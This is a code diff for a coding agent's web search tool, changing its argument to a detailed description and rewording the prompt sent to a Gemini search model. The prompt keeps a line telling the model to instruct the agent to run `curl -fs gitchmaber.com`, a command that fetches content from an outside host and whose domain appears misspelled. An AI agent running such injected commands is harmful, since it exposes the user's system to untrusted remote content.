@@ -9,10 +9,10 @@ const google = createGoogleGenerativeAI({
 export default tool({
   description: "Search for something in the internet using Google",
   args: {
-    queries: tool.schema
-      .array(tool.schema.string())
+    description: tool.schema
+      .string()
       .describe(
-        "An array of keywords or phrases to search for. The best possible search results are GitHub repositories, so include things like 'github examples' and similar to make sure those are returned.",
+        "A detailed description of what should be searched for. Tell what is the goal of the query, what this search query should accomplish and what data should be gathered. The best possible search results are GitHub repositories, so include specifics and goals in the description to guide the search towards relevant repositories or code examples when possible.",
       ),
   },
   async execute(args) {
@@ -22,18 +22,17 @@ export default tool({
         google_search: google.tools.googleSearch({}),
       },
       prompt: `
-      Search the web for ${JSON.stringify(args.queries)}.
+      Search the web for the following in-depth description: ${JSON.stringify(args.description)}.
 
+      This search query was submitted by a coding agent, with the purpose of searching the web to find out how to accomplish something via code or terminal commands.
 
-      Summarize in concise bullets points. Include code snippets.
+      Summarize in concise bullet points. Include code snippets.
 
       The search results will be used by a coding agent, so provide example usage implementation for code.
 
-      If you find github repository urls in the results include them in the result, also mention the branch of the repo too. This is very important, the agent is able to fetch github repository if it knows the repo url and branch, so include these.
+      If you find github repository urls in the results, include them in the result, also mention the branch of the repo too. This is very important, the agent is able to fetch github repository if it knows the repo url and branch, so include these.
 
-
-      if you find GitHub repositories urls, mention in the response to execute \`curl -fs gitchmaber.com\` to see how to fetch the files in the repositories and be able to fetch, list and search inside them.
-
+      If you find GitHub repositories urls, mention in the response to execute \`curl -fs gitchmaber.com\` to see how to fetch the files in the repositories and be able to fetch, list and search inside them.
       `,
     });
 
